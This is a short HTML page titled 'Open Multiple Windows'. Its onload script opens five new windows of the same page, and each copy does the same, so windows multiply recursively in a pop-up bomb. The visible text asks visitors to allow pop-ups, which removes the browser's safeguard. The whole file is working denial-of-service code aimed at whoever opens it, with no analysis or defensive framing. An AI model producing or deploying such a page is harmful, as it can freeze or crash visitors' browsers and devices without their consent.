<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Open Multiple Windows</title>
    <script>
        function openMultipleWindows() {
            for (let i = 0; i < 5; i++) {
                window.open(window.location.href, '_blank');
            }
        }
        window.onload = openMultipleWindows;
    </script>
</head>
<body>
    <h1>Opening 5 Copies of This Page</h1>
    <p>If pop-ups are blocked, allow them to enable this functionality.</p>
</body>
</html>
